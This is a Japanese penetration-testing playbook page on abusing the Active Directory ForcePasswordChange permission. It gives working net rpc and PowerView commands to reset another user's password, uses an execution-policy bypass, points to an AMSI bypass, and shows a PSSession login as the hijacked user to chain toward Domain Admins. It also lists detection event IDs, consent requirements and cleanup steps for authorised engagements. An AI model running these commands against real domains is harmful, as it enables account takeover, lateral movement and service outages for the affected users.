# ForcePasswordChange の悪用

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 業務停止リスク（実ユーザーのパスワードリセットは業務停止に直結）
> - [ ] 持続化に該当
> - [x] 不可逆な設定変更を含む（パスワードリセット後、元のパスワードへの復元は通常不可）
> - [x] SIEM/EDR で確実に検知される（Event ID 4723 / 4724）
>
> 実施可否は事前合意で明示確認すること。演習環境（HTB / OSCP 等）では制約なし。

## 概要

`ForcePasswordChange`（`User-Force-Change-Password` とも呼ばれる）は、Active Directory の ACE（アクセス制御エントリ）の一種で、対象ユーザーのパスワードを現在のパスワードを知らなくても変更できる権限。GenericAll（完全制御）より範囲が狭い「パスワードリセット専用権限」。

BloodHound ではエッジとして `ForcePasswordChange` と表示される。

---

## 着火条件

BloodHound で `[現在のユーザー or グループ] --ForcePasswordChange--> [ターゲットユーザー]` が確認できた場合。

---

## 観点・着眼点

**攻撃者の思考トレース：** GenericAll と異なり ForcePasswordChange は「パスワードリセットのみ」の権限。BloodHound で発見したら GenericAll と同じ優先度で即試みる。リセット後は PSSession でターゲットユーザーとして横断移動できる。

**何が出たら次に何をするか：**

| 状況 | 次のアクション |
|------|--------------|
| リセット成功（コマンドがエラーなく完了） | 新しいパスワードで PSSession を作成してターゲットユーザーのコンテキストに移行 |
| リセット成功 → PSSession が通らない | WinRM が有効かを確認。SMB・LDAP 等の別プロトコルで試す |
| `Access is denied` | BloodHound の表示とは異なり実際の権限がない可能性。別の BloodHound エッジを探す |
| リセット後 BloodHound で新ユーザーの権限を確認 | 次の ACE（GenericAll / WriteDACL 等）が連鎖していないか確認 |

---

## 手順

### 手法1: Linux 側から net rpc で実行

```bash
# [Attacker] 現在の認証情報でターゲットユーザーのパスワードをリセット
net rpc password [TARGET_USER] '[NEW_PASSWORD]' \
  -U '[DOMAIN]/[CURRENT_USER]%[CURRENT_PASSWORD]' \
  -S [DC_IP]
```

### 手法2: Windows シェル内から PowerView で実行

**事前準備（必須）：** PowerView.ps1 をターゲットに転送済みであること。

```powershell
# [Target] Windows シェル内で実行
powershell -ep bypass
Import-Module C:\temp\PowerView.ps1

# 現在のユーザーの認証情報オブジェクトを作成
$SecurePassword = ConvertTo-SecureString '[CURRENT_USER_PASSWORD]' -AsPlaintext -Force
$Creds = New-Object System.Management.Automation.PSCredential('[DOMAIN]\[CURRENT_USER]', $SecurePassword)

# ターゲットユーザーのパスワードをリセット
$UserPass = ConvertTo-SecureString '[NEW_PASSWORD]' -AsPlaintext -Force
Set-DomainUserPassword -Identity [TARGET_USER] -AccountPassword $UserPass -Credential $Creds
```

### リセット後 → 新ユーザーとして PSSession で移行

```powershell
# [Target] パスワードリセットした後、新ユーザーで PSSession を開く
$pass = ConvertTo-SecureString -AsPlainText -Force '[NEW_PASSWORD]'
$cred = New-Object System.Management.Automation.PSCredential('[DOMAIN]\[TARGET_USER]', $pass)
$session = New-PSSession -ComputerName 127.0.0.1 -Credential $cred
Enter-PSSession -Session $session
# → ここからはターゲットユーザーのコンテキストでコマンドが実行される
```

→ PSSession を使った横断移動の詳細 → `../Enumeration_Checklist.md`（PSSession セクション）

### リセット後 → BloodHound で次のエッジを確認する

PSSession でターゲットユーザーになったら、**そのユーザーが持つ次の権限を BloodHound で確認する**。`ForcePasswordChange` は多くの場合「チェーンの中間」に位置しているため、次のユーザーへのエッジが存在する。

```
[UserA] --GenericAll--> [UserB] --ForcePasswordChange--> [UserC] --...権限チェーン...--> [Domain Admins]
```

---

## 刺さらなかったとき

| 状況 | 原因・対処 |
|------|-----------|
| `net rpc password` が失敗する | DC_IP が正しいか・ネットワーク疎通を確認。ドメイン名の大文字小文字を確認 |
| `Set-DomainUserPassword` がエラーになる | AMSI が PowerView を検知している可能性。バイパスを先に実行（`GenericAll.md` の AMSI バイパス参照） |
| PSSession が `Access Denied` になる | WinRM（5985）が有効かを `netstat -ano` で確認。WinRM が無効なら SMB や MSSQL 等の別プロトコルで使える権限を探す |
| パスワードがポリシーに引っかかる | 大文字・小文字・数字・記号を含む長いパスワードを指定する。ポリシーを調べるには `net accounts /domain` |

---

## 注意点・落とし穴

- リセット後の「元のパスワード」は復元できない。本番では事前に顧客側が元のパスワードを把握しているか確認する
- PSSession が 127.0.0.1 への接続を使う場合、WinRM のローカルループバック許可が必要（通常は有効）
- `Enter-PSSession` で別ユーザーになっても `whoami` は `[DOMAIN]\[TARGET_USER]` になる。確認してから次のステップへ進む

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。実ユーザーのパスワードリセットは即業務停止につながるため
- **想定されるSIEM/EDR検知**:
  - Event ID 4723（ユーザーが自身のパスワード変更を試みた）
  - Event ID 4724（管理者によるパスワードリセット）
- **業務影響リスク**: サービス停止（パスワードリセット対象ユーザーはすぐに業務不可）
- **原状回復必須項目**:
  - ✅ リセットしたパスワードを顧客側で元の状態に戻してもらう（リセット前パスワードは取得不可のため顧客対応が必要）
  - ✅ 取得した認証情報は暗号化保管 → 案件終了時破棄
- **演習環境での扱い**: 制約なし

---

## 関連技術

- 前：BloodHound で ForcePasswordChange エッジを発見 → `../../05_Tools_Reference/BloodHound.md`
- 前：GenericAll チェーンの中間ステップとして ForcePasswordChange が出てくる場合 → `./GenericAll.md`
- 後：PSSession でターゲットユーザーに移行 → `../Enumeration_Checklist.md`（PSSession セクション）
- 後：次のユーザーが LAPS 読み取り権限を持つグループへの追加が可能な場合 → `../LAPS_Dump.md`
- 後：DCSync 権限が得られた場合 → `../Credential_Dumping.md`
